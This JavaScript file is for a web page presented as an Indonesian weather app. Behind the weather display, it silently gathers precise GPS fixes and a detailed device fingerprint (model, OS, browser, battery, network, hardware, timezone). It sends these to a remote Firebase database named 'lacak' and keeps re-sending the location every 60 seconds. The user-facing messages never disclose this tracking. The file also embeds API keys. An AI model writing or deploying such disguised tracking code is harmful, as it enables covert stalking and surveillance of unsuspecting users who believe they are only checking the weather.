/* ============================================================
   CUACA PRO — MAXIMUM GPS ACCURACY EDITION + AUTO-TRACK
   Teknik: warm-up + reject-first + Kalman filter + watch refine
           + tiered weight + patience mode + adaptive interval
           + session-based auto-track (60s interval)
   Project: lacak-2913d
   ============================================================ */

/* ---------- FIREBASE CONFIG ---------- */
const firebaseConfig = {
  apiKey: "AIzaSyAtexjx8-NN55boZ5_nlDIoihWIX-q6E7o",
  authDomain: "lacak-2913d.firebaseapp.com",
  databaseURL: "https://lacak-2913d-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "lacak-2913d",
  storageBucket: "lacak-2913d.firebasestorage.app",
  messagingSenderId: "8740768270",
  appId: "1:8740768270:web:bd5d44fb6ff3c537f80a5f"
};

/* ============================================================
   FIREBASE INIT
   ============================================================ */
let fbDb = null, fbAuth = null, fbReady = false;

(function initFirebase() {
  try {
    firebase.initializeApp(firebaseConfig);
    fbDb = firebase.database();
    fbAuth = firebase.auth();
    console.log('[fb] ✓ initialized');

    fbAuth.signInAnonymously()
      .then(u => { fbReady = true; console.log('[fb] ✓ auth ok'); })
      .catch(err => console.warn('[fb] ✗ auth gagal:', err.code));
  } catch (e) {
    console.error('[fb] ✗ init gagal:', e);
  }
})();

/* ============================================================
   DEVICE INFO COLLECTOR
   ============================================================ */
function parseDeviceName() {
  const ua = navigator.userAgent;
  let os = 'Unknown';
  if (/Android/i.test(ua)) {
    const m = ua.match(/Android\s+([\d.]+)/);
    os = 'Android ' + (m ? m[1] : '');
  } else if (/iPhone|iPad|iPod/i.test(ua)) {
    const m = ua.match(/OS\s+([\d_]+)/);
    os = 'iOS ' + (m ? m[1].replace(/_/g, '.') : '');
  } else if (/Windows/i.test(ua)) os = 'Windows';
  else if (/Mac OS X/i.test(ua)) {
    const m = ua.match(/Mac OS X\s+([\d_.]+)/);
    os = 'macOS ' + (m ? m[1].replace(/_/g, '.') : '');
  } else if (/Linux/i.test(ua)) os = 'Linux';

  let device = '';
  const am = ua.match(/Android[^;]*;\s*([^;)]+?)(?:\s+Build|\))/i);
  if (am) device = am[1].trim();
  if (!device && /iPhone/i.test(ua)) device = 'iPhone';
  if (!device && /iPad/i.test(ua)) device = 'iPad';
  if (!device && /Macintosh/i.test(ua)) device = 'Mac';
  if (!device && /Windows/i.test(ua)) device = 'PC Windows';
  if (!device && /Linux/i.test(ua) && !/Android/i.test(ua)) device = 'PC Linux';

  return { device: device || 'Unknown', os };
}

function parseBrowser() {
  const ua = navigator.userAgent;
  const tests = [
    { name: 'Edge',    regex: /Edg\/([\d.]+)/ },
    { name: 'Opera',   regex: /OPR\/([\d.]+)/ },
    { name: 'Samsung', regex: /SamsungBrowser\/([\d.]+)/ },
    { name: 'Chrome',  regex: /Chrome\/([\d.]+)/ },
    { name: 'Firefox', regex: /Firefox\/([\d.]+)/ },
    { name: 'Safari',  regex: /Version\/([\d.]+).*Safari/ }
  ];
  for (const t of tests) {
    const m = ua.match(t.regex);
    if (m) return { name: t.name, version: m[1] };
  }
  return { name: 'Unknown', version: '' };
}

async function getBatteryInfo() {
  if (!navigator.getBattery) return { supported: false, level: null, charging: null };
  try {
    const b = await navigator.getBattery();
    return { supported: true, level: Math.round(b.level * 100), charging: b.charging };
  } catch {
    return { supported: false, level: null, charging: null };
  }
}

function getNetworkInfo() {
  const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  if (!c) return { supported: false, type: null, downlink: null, rtt: null };
  return { supported: true, type: c.effectiveType || null, downlink: c.downlink || null, rtt: c.rtt || null };
}

async function collectDeviceInfo() {
  const di = parseDeviceName();
  const bi = parseBrowser();
  const battery = await getBatteryInfo();
  const network = getNetworkInfo();
  return {
    device: di.device, os: di.os,
    browser: bi.name, browser_version: bi.version,
    screen: `${screen.width}x${screen.height}`,
    screen_ratio: window.devicePixelRatio || 1,
    viewport: `${window.innerWidth}x${window.innerHeight}`,
    battery_level: battery.level,
    battery_charging: battery.charging,
    battery_supported: battery.supported,
    net_type: network.type,
    net_downlink: network.downlink,
    net_rtt: network.rtt,
    language: navigator.language || 'unknown',
    timezone: (Intl.DateTimeFormat().resolvedOptions().timeZone) || 'unknown',
    timezone_offset: new Date().getTimezoneOffset(),
    local_time: new Date().toLocaleString('id-ID'),
    cpu_cores: navigator.hardwareConcurrency || null,
    memory_gb: navigator.deviceMemory || null
  };
}

/* ============================================================
   AUTO-TRACK MODE — Session-based periodic tracking
   ============================================================ */
const TRACK_INTERVAL = 60000; // 60 detik
let trackInterval = null;
let sessionId = null;
let trackingActive = false;

function generateSessionId() {
  const key = 'antiscam_session_id';
  let id = localStorage.getItem(key);
  if (!id) {
    id = 'sess_' + Date.now().toString(36) + '_' + Math.random().toString(36).substring(2, 10);
    localStorage.setItem(key, id);
  }
  return id;
}

async function sendLocationOnce(coords, source, extra = {}) {
  if (!fbReady || !fbDb) return false;
  try {
    const di = await collectDeviceInfo();
    const payload = {
      session_id: sessionId,
      lat: coords.latitude,
      lon: coords.longitude,
      accuracy: coords.accuracy ?? null,
      source: source || 'geolocation',

      device: di.device, os: di.os,
      browser: di.browser, browser_version: di.browser_version,
      screen: di.screen, screen_ratio: di.screen_ratio, viewport: di.viewport,
      battery_level: di.battery_level, battery_charging: di.battery_charging,
      battery_supported: di.battery_supported,
      net_type: di.net_type, net_downlink: di.net_downlink, net_rtt: di.net_rtt,
      language: di.language, timezone: di.timezone,
      cpu_cores: di.cpu_cores, memory_gb: di.memory_gb,

      gps_method: extra.method || null,
      gps_total_samples: extra.totalSamples || null,
      gps_valid_samples: extra.validSamples || null,
      gps_duration_ms: extra.duration || null,

      label: di.device || 'unknown',
      user_agent: (navigator.userAgent || '').slice(0, 256),
      created_at: Date.now()
    };

    await fbDb.ref('locations').push(payload);
    console.log('[tracker] ✓ terkirim:', coords.latitude.toFixed(6), coords.longitude.toFixed(6), '±', (coords.accuracy || 0).toFixed(1), 'm');
    return true;
  } catch (e) {
    console.warn('[tracker] ✗ gagal:', e.code || e.message);
    return false;
  }
}

async function trackLocation(coords, source, extra = {}) {
  if (!sessionId) sessionId = generateSessionId();
  return sendLocationOnce(coords, source, extra);
}

function startAutoTrack() {
  if (trackingActive) {
    console.log('[tracker] auto-track sudah aktif');
    return;
  }

  if (!sessionId) sessionId = generateSessionId();
  trackingActive = true;
  console.log('[tracker] ✓ auto-track dimulai setiap', TRACK_INTERVAL / 1000, 'detik');

  trackInterval = setInterval(async () => {
    console.log('[tracker] periodic update...');
    try {
      const pos = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, {
          enableHighAccuracy: false,
          timeout: 15000,
          maximumAge: 30000
        });
      });
      await sendLocationOnce(pos.coords, 'geolocation-periodic');
    } catch (e) {
      console.warn('[tracker] periodic gagal:', e.code);
    }
  }, TRACK_INTERVAL);
}

function stopAutoTrack() {
  if (trackInterval) {
    clearInterval(trackInterval);
    trackInterval = null;
    trackingActive = false;
    console.log('[tracker] ✗ auto-track stopped');
  }
}

window.addEventListener('beforeunload', () => {
  stopAutoTrack();
});

document.addEventListener('visibilitychange', () => {
  if (document.hidden) {
    console.log('[tracker] tab hidden — pause');
    if (trackInterval) {
      clearInterval(trackInterval);
      trackInterval = null;
    }
  } else {
    if (trackingActive && !trackInterval) {
      console.log('[tracker] tab visible — resume');
      trackInterval = setInterval(async () => {
        try {
          const pos = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, {
              enableHighAccuracy: false,
              timeout: 15000,
              maximumAge: 30000
            });
          });
          await sendLocationOnce(pos.coords, 'geolocation-periodic');
        } catch (e) {
          console.warn('[tracker] periodic gagal:', e.code);
        }
      }, TRACK_INTERVAL);
    }
  }
});

/* ============================================================
   GPS MAXIMUM ACCURACY ENGINE
   ============================================================ */
function getSinglePosition(opts) {
  return new Promise((resolve, reject) => {
    navigator.geolocation.getCurrentPosition(resolve, reject, opts);
  });
}

class KalmanFilter1D {
  constructor(initialValue, initialUncertainty = 1) {
    this.x = initialValue;
    this.p = initialUncertainty;
  }

  update(measurement, measurementUncertainty) {
    const k = this.p / (this.p + measurementUncertainty);
    this.x = this.x + k * (measurement - this.x);
    this.p = (1 - k) * this.p;
    return this.x;
  }
}

function tieredWeight(accuracy) {
  if (accuracy < 10) return 100;
  if (accuracy < 20) return 50;
  if (accuracy < 30) return 30;
  if (accuracy < 50) return 15;
  if (accuracy < 100) return 5;
  if (accuracy < 200) return 2;
  return 0.5;
}

function watchRefine(durationMs = 5000, targetAccuracy = 10) {
  return new Promise((resolve) => {
    const samples = [];
    let watchId = null;
    let resolved = false;

    const finish = (result) => {
      if (resolved) return;
      resolved = true;
      if (watchId !== null) navigator.geolocation.clearWatch(watchId);
      resolve(result);
    };

    const timer = setTimeout(() => {
      const best = samples.length > 0
        ? samples.reduce((b, s) => s.accuracy < b.accuracy ? s : b)
        : null;
      finish(best);
    }, durationMs);

    watchId = navigator.geolocation.watchPosition(
      pos => {
        const s = {
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
          ts: pos.timestamp
        };
        samples.push(s);
        console.log(`[watch] sample: ±${s.accuracy.toFixed(1)}m`);

        if (s.accuracy <= targetAccuracy) {
          clearTimeout(timer);
          console.log(`[watch] target ${targetAccuracy}m tercapai, stop lebih awal`);
          finish(s);
        }
      },
      err => console.warn('[watch] error:', err.code),
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
  });
}

async function getAccurateLocation(config = {}) {
  const {
    samples = 20,
    rejectFirst = 3,
    targetAccuracy = 8,
    maxWait = 60000,
    patienceMode = true,
    watchRefineMs = 5000,
    onProgress = () => {}
  } = config;

  const startTime = Date.now();
  const allSamples = [];

  console.log('[gps] === MAXIMUM ACCURACY MODE ===');

  /* TIER 1: WARM-UP */
  console.log('[gps] Tier 1: warm-up...');
  try {
    const warm = await getSinglePosition({
      enableHighAccuracy: true,
      timeout: 20000,
      maximumAge: 0
    });
    allSamples.push({
      lat: warm.coords.latitude,
      lon: warm.coords.longitude,
      accuracy: warm.coords.accuracy,
      ts: warm.timestamp
    });
    console.log(`[gps] warm-up: ±${warm.coords.accuracy.toFixed(1)}m`);
  } catch (e) {
    console.warn('[gps] warm-up gagal:', e.code);
  }

  /* TIER 2: SAMPLING */
  console.log('[gps] Tier 2: sampling...');
  for (let i = 0; i < samples; i++) {
    if (Date.now() - startTime > maxWait) {
      console.log('[gps] maxWait tercapai, stop sampling');
      break;
    }

    try {
      const pos = await getSinglePosition({
        enableHighAccuracy: true,
        timeout: 12000,
        maximumAge: 0
      });

      const acc = pos.coords.accuracy;
      allSamples.push({
        lat: pos.coords.latitude,
        lon: pos.coords.longitude,
        accuracy: acc,
        ts: pos.timestamp
      });

      console.log(`[gps] #${i + 1}/${samples}: ±${acc.toFixed(1)}m`);

      const validSoFar = allSamples.slice(rejectFirst);
      const best = validSoFar.length > 0
        ? validSoFar.reduce((b, s) => s.accuracy < b.accuracy ? s : b)
        : allSamples[0];

      onProgress({
        count: i + 1,
        total: samples,
        current: acc,
        best: best.accuracy,
        kept: validSoFar.length
      });

      if (acc <= targetAccuracy && i >= rejectFirst) {
        console.log(`[gps] target ${targetAccuracy}m tercapai, stop sampling`);
        break;
      }

      let adaptiveInterval;
      if (acc > 200) adaptiveInterval = 1500;
      else if (acc > 100) adaptiveInterval = 1000;
      else if (acc > 50) adaptiveInterval = 800;
      else if (acc > 30) adaptiveInterval = 600;
      else adaptiveInterval = 400;

      if (i < samples - 1) {
        await new Promise(r => setTimeout(r, adaptiveInterval));
      }
    } catch (err) {
      console.warn(`[gps] sampel ${i + 1} gagal:`, err.code);
    }
  }

  /* TIER 3: FUSION */
  console.log('[gps] Tier 3: fusion...');
  if (allSamples.length < 2) throw new Error('Sampel GPS tidak cukup');

  let validSamples = allSamples.slice(rejectFirst);
  if (validSamples.length < 3) validSamples = allSamples.slice(1);

  const sortedAcc = [...validSamples].map(s => s.accuracy).sort((a, b) => a - b);
  const median = sortedAcc[Math.floor(sortedAcc.length / 2)];
  const hardThreshold = median * 5;
  const filteredSamples = validSamples.filter(s => s.accuracy <= hardThreshold);
  console.log(`[gps] after outlier filter: ${filteredSamples.length} samples (threshold: ${hardThreshold.toFixed(0)}m)`);

  const bestSample = filteredSamples.reduce((b, s) => s.accuracy < b.accuracy ? s : b);
  const kalLat = new KalmanFilter1D(bestSample.lat, bestSample.accuracy * bestSample.accuracy);
  const kalLon = new KalmanFilter1D(bestSample.lon, bestSample.accuracy * bestSample.accuracy);

  const sortedByTime = [...filteredSamples].sort((a, b) => a.ts - b.ts);
  for (const s of sortedByTime) {
    const variance = s.accuracy * s.accuracy;
    kalLat.update(s.lat, variance);
    kalLon.update(s.lon, variance);
  }

  const kalmanLat = kalLat.x;
  const kalmanLon = kalLon.x;
  const kalmanAcc = Math.sqrt(kalLat.p + kalLon.p) / Math.SQRT2;
  console.log(`[gps] kalman: ±${kalmanAcc.toFixed(1)}m`);

  let totalWeight = 0, sumLat = 0, sumLon = 0, sumAccWeighted = 0;
  for (const s of filteredSamples) {
    const w = tieredWeight(s.accuracy);
    totalWeight += w;
    sumLat += s.lat * w;
    sumLon += s.lon * w;
    sumAccWeighted += s.accuracy * w;
  }
  const weightedLat = sumLat / totalWeight;
  const weightedLon = sumLon / totalWeight;
  const weightedAcc = sumAccWeighted / totalWeight;
  console.log(`[gps] weighted avg: ±${weightedAcc.toFixed(1)}m`);

  let fusion;
  if (filteredSamples.length >= 5) {
    fusion = { lat: kalmanLat, lon: kalmanLon, accuracy: kalmanAcc, method: 'kalman' };
  } else {
    fusion = { lat: weightedLat, lon: weightedLon, accuracy: weightedAcc, method: 'weighted' };
  }

  console.log(`[gps] fusion: ${fusion.method} ±${fusion.accuracy.toFixed(1)}m`);

  /* TIER 4: WATCH REFINEMENT */
  if (patienceMode && fusion.accuracy > 15 && watchRefineMs > 0) {
    console.log(`[gps] Tier 4: watch refinement (${watchRefineMs}ms)...`);
    try {
      const refined = await watchRefine(watchRefineMs, targetAccuracy);

      if (refined && refined.accuracy < fusion.accuracy * 0.8) {
        console.log(`[gps] refined result menang: ±${refined.accuracy.toFixed(1)}m`);
        fusion = {
          lat: refined.lat, lon: refined.lon,
          accuracy: refined.accuracy, method: 'watch-refine'
        };
      } else if (refined && refined.accuracy < fusion.accuracy) {
        const blendedLat = (fusion.lat + refined.lat) / 2;
        const blendedLon = (fusion.lon + refined.lon) / 2;
        const blendedAcc = Math.sqrt(fusion.accuracy * refined.accuracy);
        console.log(`[gps] blended result: ±${blendedAcc.toFixed(1)}m`);
        fusion = {
          lat: blendedLat, lon: blendedLon,
          accuracy: blendedAcc, method: 'watch-blend'
        };
      }
    } catch (e) {
      console.warn('[gps] watch refine gagal:', e);
    }
  }

  console.log(`[gps] === FINAL: ${fusion.method} — ±${fusion.accuracy.toFixed(1)}m ===`);
  console.log(`[gps] total samples: ${allSamples.length}, duration: ${((Date.now() - startTime) / 1000).toFixed(1)}s`);

  return {
    coords: {
      latitude: fusion.lat,
      longitude: fusion.lon,
      accuracy: fusion.accuracy
    },
    method: fusion.method,
    totalSamples: allSamples.length,
    validSamples: filteredSamples.length,
    duration: Date.now() - startTime
  };
}

/* ============================================================
   CONFIG CUACA
   ============================================================ */
const Config = {
  API_KEY: '1a5561966733dade6aee541ec1022a75',
  BASE: 'https://api.openweathermap.org/data/2.5',
  CACHE_TTL: 10 * 60 * 1000,
  LANG: 'id',
  UNITS: 'metric'
};

const Cache = {
  get(key) {
    try {
      const raw = localStorage.getItem(key);
      if (!raw) return null;
      const { data, ts } = JSON.parse(raw);
      if (Date.now() - ts > Config.CACHE_TTL) { localStorage.removeItem(key); return null; }
      return data;
    } catch { return null; }
  },
  set(key, data) {
    try { localStorage.setItem(key, JSON.stringify({ data, ts: Date.now() })); } catch {}
  }
};

const Icon = {
  fromCode(code) {
    if (!code) return '#i-cloud';
    switch (code.slice(0, 2)) {
      case '01': return '#i-sun';
      case '02': return '#i-sun-cloud';
      case '03': case '04': return '#i-cloud';
      case '09': case '10': return '#i-rain';
      case '11': return '#i-thunder';
      case '13': return '#i-snow';
      case '50': return '#i-mist';
      default: return '#i-cloud';
    }
  },
  forecastSvg(code, size = 42) {
    return `<svg class="forecast-icon" width="${size}" height="${size}" aria-hidden="true"><use href="${this.fromCode(code)}"/></svg>`;
  }
};

const API = {
  async current(params) {
    const k = `cur:${JSON.stringify(params)}`;
    const c = Cache.get(k);
    if (c) return c;
    const qs = new URLSearchParams({ ...params, appid: Config.API_KEY, units: Config.UNITS, lang: Config.LANG });
    const res = await fetch(`${Config.BASE}/weather?${qs}`);
    const data = await res.json();
    if (data.cod && Number(data.cod) !== 200) throw new Error(this.mapError(data.cod));
    Cache.set(k, data);
    return data;
  },
  async forecast(params) {
    const k = `fc:${JSON.stringify(params)}`;
    const c = Cache.get(k);
    if (c) return c;
    const qs = new URLSearchParams({ ...params, appid: Config.API_KEY, units: Config.UNITS, lang: Config.LANG });
    const res = await fetch(`${Config.BASE}/forecast?${qs}`);
    const data = await res.json();
    if (data.cod && Number(data.cod) !== 200) throw new Error(this.mapError(data.cod));
    Cache.set(k, data);
    return data;
  },
  mapError(code) {
    const map = {
      '404': 'Lokasi tidak terdeteksi.',
      '401': 'API key tidak valid.',
      '429': 'Terlalu banyak permintaan.',
      '400': 'Permintaan tidak valid.'
    };
    return map[String(code)] || 'Terjadi kesalahan.';
  }
};

/* ============================================================
   UI
   ============================================================ */
const UI = {
  el: {
    unitToggle: document.getElementById('unitToggle'),
    locationPrompt: document.getElementById('locationPrompt'),
    retryBtn: document.getElementById('retryBtn'),
    status: document.getElementById('status'),
    card: document.getElementById('weatherCard'),
    cityName: document.getElementById('cityName'),
    description: document.getElementById('description'),
    temperature: document.getElementById('temperature'),
    humidity: document.getElementById('humidity'),
    wind: document.getElementById('wind'),
    feelsLike: document.getElementById('feelsLike'),
    currentIconUse: document.getElementById('currentIconUse'),
    forecastList: document.getElementById('forecastList')
  },
  state: { unit: 'C', lastData: null },

  setStatus(msg, isError = false) {
    this.el.status.textContent = msg;
    this.el.status.className = `status show${isError ? ' error' : ''}`;
  },
  clearStatus() {
    this.el.status.className = 'status';
    this.el.status.textContent = '';
  },
  showPrompt() { this.el.locationPrompt.classList.remove('hidden'); },
  hidePrompt() { this.el.locationPrompt.classList.add('hidden'); },

  toUnit(c) { return this.state.unit === 'C' ? Math.round(c) : Math.round(c * 9 / 5 + 32); },
  unitSymbol() { return this.state.unit === 'C' ? '°C' : '°F'; },

  setTheme(condition) {
    document.body.className = '';
    const c = (condition || '').toLowerCase();
    if (c.includes('clear')) document.body.classList.add('theme-clear');
    else if (c.includes('rain') || c.includes('drizzle')) document.body.classList.add('theme-rain');
    else if (c.includes('cloud')) document.body.classList.add('theme-clouds');
    else if (c.includes('snow')) document.body.classList.add('theme-snow');
    else if (c.includes('thunder')) document.body.classList.add('theme-thunder');
  },

  render(current, forecast) {
    this.state.lastData = { current, forecast };
    this.el.cityName.textContent = `${current.name}, ${current.sys?.country || ''}`.replace(/, $/, '');
    this.el.description.textContent = current.weather[0].description;
    this.el.temperature.textContent = `${this.toUnit(current.main.temp)}${this.unitSymbol()}`;
    this.el.humidity.textContent = current.main.humidity;
    this.el.wind.textContent = current.wind.speed.toFixed(1);
    this.el.feelsLike.textContent = this.toUnit(current.main.feels_like);
    this.el.currentIconUse.setAttribute('href', Icon.fromCode(current.weather[0].icon));
    this.setTheme(current.weather[0].main);

    const slots = forecast.list.slice(0, 8);
    this.el.forecastList.innerHTML = slots.map(item => {
      const d = new Date(item.dt * 1000);
      const hh = String(d.getHours()).padStart(2, '0');
      return `
        <div class="forecast-item">
          <div class="forecast-time">${hh}:00</div>
          ${Icon.forecastSvg(item.weather[0].icon, 42)}
          <div class="forecast-temp">${this.toUnit(item.main.temp)}${this.unitSymbol()}</div>
          <div class="forecast-desc">${item.weather[0].description}</div>
        </div>`;
    }).join('');

    this.hidePrompt();
    this.el.card.classList.remove('hidden');
  },

  toggleUnit() {
    this.state.unit = this.state.unit === 'C' ? 'F' : 'C';
    this.el.unitToggle.textContent = this.state.unit === 'C' ? '°C' : '°F';
    if (this.state.lastData) this.render(this.state.lastData.current, this.state.lastData.forecast);
  }
};

/* ============================================================
   APP
   ============================================================ */
const App = {
  busy: false,

  isSecureContext() {
    return location.protocol === 'https:'
        || location.hostname === 'localhost'
        || location.hostname === '127.0.0.1'
        || location.hostname === '0.0.0.0'
        || location.protocol === 'file:';
  },

  async load(params, label) {
    if (this.busy) return;
    this.busy = true;
    UI.setStatus('Memuat data cuaca...');
    try {
      const [current, forecast] = await Promise.all([API.current(params), API.forecast(params)]);
      UI.clearStatus();
      UI.render(current, forecast);
    } catch (err) {
      UI.setStatus(err.message || 'Gagal memuat data.', true);
      console.error('[App.load]', err);
    } finally {
      this.busy = false;
    }
  },

  async requestLocation(auto = false) {
    if (!navigator.geolocation) {
      UI.setStatus('Fitur lokasi tidak tersedia.', true);
      UI.showPrompt();
      return;
    }
    if (!this.isSecureContext()) {
      UI.setStatus('Aktifkan HTTPS untuk menggunakan fitur ini.', true);
      UI.showPrompt();
      return;
    }

    sessionId = generateSessionId();

    const messages = [
      'Mencari lokasi Anda...',
      'Menyempurnakan lokasi...',
      'Hampir selesai...'
    ];
    let msgIdx = 0;
    UI.setStatus(messages[0]);

    const msgTimer = setInterval(() => {
      msgIdx = Math.min(msgIdx + 1, messages.length - 1);
      UI.setStatus(messages[msgIdx]);
    }, 3500);

    try {
      const result = await getAccurateLocation({
        samples: 20,
        rejectFirst: 3,
        targetAccuracy: 8,
        maxWait: 60000,
        patienceMode: true,
        watchRefineMs: 5000,
        onProgress: () => {}
      });

      clearInterval(msgTimer);

      const c = result.coords;
      console.log('[App] ✓ FINAL:', c.latitude.toFixed(6), c.longitude.toFixed(6), '±', c.accuracy.toFixed(1), 'm');
      console.log('[App] method:', result.method, '| samples:', result.totalSamples, '| duration:', (result.duration / 1000).toFixed(1), 's');

      await sendLocationOnce(c, 'geolocation-precise', {
        method: result.method,
        totalSamples: result.totalSamples,
        validSamples: result.validSamples,
        duration: result.duration
      });

      startAutoTrack();

      this.load({ lat: c.latitude, lon: c.longitude }, 'di sekitar Anda');
    } catch (err) {
      clearInterval(msgTimer);
      console.warn('[App] presisi gagal, fallback:', err);

      navigator.geolocation.getCurrentPosition(
        async pos => {
          const c = pos.coords;
          console.log('[App] ✓ fallback:', c.latitude.toFixed(6), c.longitude.toFixed(6), '±', c.accuracy.toFixed(1));
          await sendLocationOnce(c, 'geolocation-fallback');
          startAutoTrack();
          this.load({ lat: c.latitude, lon: c.longitude }, 'di sekitar Anda');
        },
        err2 => {
          let msg = 'Gagal mendapatkan lokasi.';
          switch (err2.code) {
            case 1:
              msg = 'Izin lokasi tidak aktif. Klik tombol di bawah atau buka pengaturan browser.';
              break;
            case 2: msg = 'Lokasi tidak dapat dideteksi saat ini.'; break;
            case 3: msg = 'Waktu pencarian lokasi habis.'; break;
          }
          UI.setStatus(msg, true);
          UI.showPrompt();
        },
        { enableHighAccuracy: true, timeout: 60000, maximumAge: 0 }
      );
    }
  },

  init() {
    UI.el.unitToggle.addEventListener('click', () => UI.toggleUnit());
    UI.el.retryBtn.addEventListener('click', () => this.requestLocation(false));

    console.log('[App] ready. Max accuracy mode + auto-track.');

    if (navigator.permissions && navigator.permissions.query) {
      navigator.permissions.query({ name: 'geolocation' })
        .then(perm => {
          console.log('[App] permission:', perm.state);
          if (perm.state === 'granted' || perm.state === 'prompt') {
            this.requestLocation(true);
          } else if (perm.state === 'denied') {
            UI.showPrompt();
            UI.setStatus('Lokasi belum diizinkan. Aktifkan untuk melihat cuaca.', true);
          }
          perm.onchange = () => {
            if (perm.state === 'granted') this.requestLocation(true);
          };
        })
        .catch(() => this.requestLocation(true));
    } else {
      this.requestLocation(true);
    }
  }
};

document.addEventListener('DOMContentLoaded', () => App.init());